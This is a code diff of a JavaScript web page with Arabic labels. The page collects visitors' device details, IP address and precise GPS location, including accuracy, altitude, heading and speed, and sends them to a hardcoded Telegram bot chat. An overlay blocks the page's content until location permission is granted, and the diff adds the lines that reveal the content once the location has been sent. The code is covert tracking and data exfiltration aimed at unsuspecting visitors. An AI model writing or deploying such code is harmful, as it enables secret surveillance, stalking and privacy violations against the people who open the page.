@@ -3,16 +3,19 @@ function sendInformationToTelegram(info) {
     var chatId = '962686305';
     var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;
 
-    fetch(url).then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.json();
-    }).then(data => {
-        console.log('Information sent to Telegram bot:', data);
-    }).catch(error => {
-        console.error('There was a problem with the fetch operation:', error);
-    });
+    fetch(url)
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Information sent to Telegram bot:', data);
+        })
+        .catch(error => {
+            console.error('There was a problem with the fetch operation:', error);
+        });
 }
 
 function collectDeviceInfo() {
@@ -47,7 +50,7 @@ function collectDeviceInfo() {
     var wd = window.screen.width;
     var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
 
-    var deviceInfo = `منصة الجهاز: ${ptf}\نعدد النوى: ${cc}\ن الذاكرة العشوائية: ${ram}\ن نوع المتصفح: ${brw}\ن نظام التشغيل: ${os}\ن دقة الشاشة: ${ht}x${wd}\ن الشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\ن نوع وحدة المعالجة الرسومية: ${ren}`;
+    var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
     sendInformationToTelegram(deviceInfo);
 
     // Collect IP address
@@ -72,8 +75,11 @@ function requestLocationPermission() {
             var spd = position.coords.speed || 'غير متوفر';
 
             var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
-            var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\ن دقة الموقع: ${acc} متر\n الارتفاع: ${alt} متر\n الاتجاه: ${dir} درجة\n السرعة: ${spd} متر/ثانية\n\n رابط الموقع على جوجل مابس: ${googleMapsLink}`;
+            var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
             sendInformationToTelegram(locationInfo);
+
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
         }, function (error) {
             alert('يرجى تفعيل إذن الموقع للمتابعة.');
             document.getElementById('overlay').style.display = 'flex';
